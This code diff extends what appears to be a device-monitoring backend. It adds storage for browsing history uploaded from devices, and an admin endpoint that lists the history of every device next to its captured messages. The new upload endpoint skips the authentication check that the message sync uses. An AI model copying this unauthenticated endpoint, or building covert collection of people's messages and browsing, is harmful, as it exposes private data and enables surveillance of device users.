@@ -61,7 +61,7 @@ app.use(express.json({ limit: '2mb' }));
 app.use(morgan(isProduction ? 'combined' : 'dev'));
 app.use(rateLimit({ windowMs: 60_000, max: 120, standardHeaders: true, legacyHeaders: false }));
 
-// Health Check Endpoints (Placed BEFORE DB connection middleware so health checks never fail due to DB state)
+// Health Check Endpoints
 app.get(['/', '/health', '/api/health'], (_req, res) => {
   res.json({
     ok: true,
@@ -156,6 +156,17 @@ MessageSchema.index({ accountId: 1, capturedAt: -1 });
 MessageSchema.index({ deviceId: 1, capturedAt: -1 });
 MessageSchema.index({ sender: 1 });
 
+const BrowserHistorySchema = new mongoose.Schema({
+  deviceId: { type: String, required: true },
+  deviceName: { type: String, default: 'Device' },
+  title: { type: String, default: 'Web Page' },
+  url: { type: String, required: true },
+  timestamp: { type: Date, default: Date.now },
+  createdAt: { type: Date, default: Date.now }
+}, { collection: 'browserHistory' });
+
+BrowserHistorySchema.index({ deviceId: 1, timestamp: -1 });
+
 const AuditLogSchema = new mongoose.Schema({
   actor: { type: String, default: 'system' },
   action: { type: String, required: true },
@@ -173,6 +184,7 @@ const AdminSchema = new mongoose.Schema({
 const User = mongoose.model('User', UserSchema);
 const Device = mongoose.model('Device', DeviceSchema);
 const Message = mongoose.model('Message', MessageSchema);
+const BrowserHistory = mongoose.model('BrowserHistory', BrowserHistorySchema);
 const AuditLog = mongoose.model('AuditLog', AuditLogSchema);
 const Admin = mongoose.model('Admin', AdminSchema);
 
@@ -355,6 +367,33 @@ app.post('/api/messages/sync', requireAuth, async (req, res) => {
   res.status(200).json({ accepted: true });
 });
 
+// Browser History Sync Endpoint
+app.post('/api/browser/history/sync', async (req, res) => {
+  try {
+    const { deviceId, deviceName, history } = req.body || {};
+    if (!deviceId || !Array.isArray(history) || !history.length) {
+      return res.status(400).json({ message: 'Invalid history payload' });
+    }
+
+    const docs = history.map((item: any) => ({
+      deviceId,
+      deviceName: deviceName || item.deviceName || deviceId,
+      title: item.title || 'Web Page',
+      url: item.url || '',
+      timestamp: new Date(item.timestamp || Date.now())
+    })).filter((d) => d.url.length > 0);
+
+    if (docs.length) {
+      await BrowserHistory.insertMany(docs);
+      notifyAdminClients({ type: 'new_history', deviceId, count: docs.length, timestamp: Date.now() });
+    }
+
+    res.json({ ok: true, synced: docs.length });
+  } catch (err) {
+    res.status(500).json({ message: 'Failed to sync history' });
+  }
+});
+
 app.get('/api/messages', requireAuth, async (req, res) => {
   const currentUser = req.user;
   if (!currentUser || !currentUser.sub) return res.status(401).json({ message: 'Authentication required' });
@@ -413,6 +452,23 @@ app.get('/api/admin/messages', requireAuth, requireAdmin, async (req, res) => {
   }));
 
   res.json({ messages: enrichedMessages });
+});
+
+// Admin Get Device Browsing History
+app.get('/api/admin/browser-history', requireAuth, requireAdmin, async (req, res) => {
+  const limit = Math.min(Number(req.query.limit || 100), 300);
+  const history = await BrowserHistory.find({}).sort({ timestamp: -1 }).limit(limit).lean();
+
+  const deviceIds = Array.from(new Set(history.map((h) => h.deviceId).filter(Boolean)));
+  const devices = await Device.find({ deviceId: { $in: deviceIds } }).lean();
+  const deviceNameMap = new Map(devices.map((d) => [d.deviceId, d.deviceName || d.deviceId]));
+
+  const enrichedHistory = history.map((item) => ({
+    ...item,
+    deviceName: deviceNameMap.get(item.deviceId) || item.deviceName || item.deviceId || 'Device'
+  }));
+
+  res.json({ history: enrichedHistory });
 });
 
 app.post('/api/admin/revoke-device', requireAuth, requireAdmin, async (req, res) => {
